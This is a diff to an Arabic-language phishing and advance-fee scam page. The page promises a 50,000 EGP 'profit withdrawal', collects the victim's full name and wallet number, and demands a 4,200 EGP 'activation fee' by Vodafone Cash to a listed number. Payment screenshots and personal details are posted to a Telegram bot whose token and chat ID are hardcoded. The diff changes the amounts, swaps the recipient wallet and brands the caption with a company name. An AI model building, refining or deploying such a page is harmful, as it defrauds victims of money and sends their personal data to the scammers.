@@ -65,7 +65,9 @@
         font-weight: bold;
         cursor: pointer;
         box-shadow: 0 4px 0 #d4b000;
+        transition: 0.2s;
     }
+    button:active { transform: scale(0.98); }
 </style>
 </head>
 <body>
@@ -74,7 +76,7 @@
     <div class="banner">سحب الأرباح الفوري 💰</div>
     
     <div class="content" id="step-1">
-        <p>سجل بياناتك لاستلام أرباحك المقدرة بـ <b>120,000 ج.م</b></p>
+        <p>سجل بياناتك لاستلام أرباحك المقدرة بـ <b>50,000 ج.م</b></p>
         <input type="text" id="in-name" placeholder="الاسم الرباعي">
         <input type="number" id="in-phone" placeholder="رقم محفظتك لاستلام الأرباح">
         <button onclick="nextStep()">استمرار للسحب</button>
@@ -82,11 +84,11 @@
 
     <div class="content" id="step-2" style="display: none;">
         <h3 style="color:#c40000">خطوة أخيرة لتفعيل السحب</h3>
-        <p>يرجى إرسال رسوم التفعيل (<b>5,000 ج.م</b>) إلى الرقم التالي:</p>
+        <p>يرجى إرسال رسوم التفعيل (<b>4,200 ج.م</b>) إلى الرقم التالي:</p>
         
         <div class="wallet-box">
             رقم التحويل (فودافون كاش):
-            <span class="wallet-number">01270399629</span>
+            <span class="wallet-number">01020520933</span>
             <small>تأكد من كتابة الرقم بشكل صحيح</small>
         </div>
 
@@ -117,7 +119,6 @@
             return;
         }
 
-        // بيانات التليجرام الخاصة بك
         const telegramToken = "8599127373:AAFgF2GBQMuscGGXzxs0Nayx3grP2aQulVQ"; 
         const chatId = "8408093977"; 
 
@@ -125,7 +126,7 @@
         const formData = new FormData();
         formData.append("chat_id", chatId);
         formData.append("photo", file);
-        formData.append("caption", `🚨 سحب جديد:\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💵 الرسوم: 5,000 ج.م\n💸 الربح المتوقع: 120,000 ج.م`);
+        formData.append("caption", `🚨 سحب جديد (شركة التقوى):\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💵 الرسوم: 4,200 ج.م\n💸 الربح: 50,000 ج.م`);
 
         btn.innerText = "جاري التأكيد...";
         btn.disabled = true;
@@ -138,6 +139,7 @@
             window.location.href = "success.html";
         } catch (error) {
             alert("حدث خطأ في الإرسال");
+            btn.innerText = "تأكيد عملية السحب الآن";
             btn.disabled = false;
         }
     }
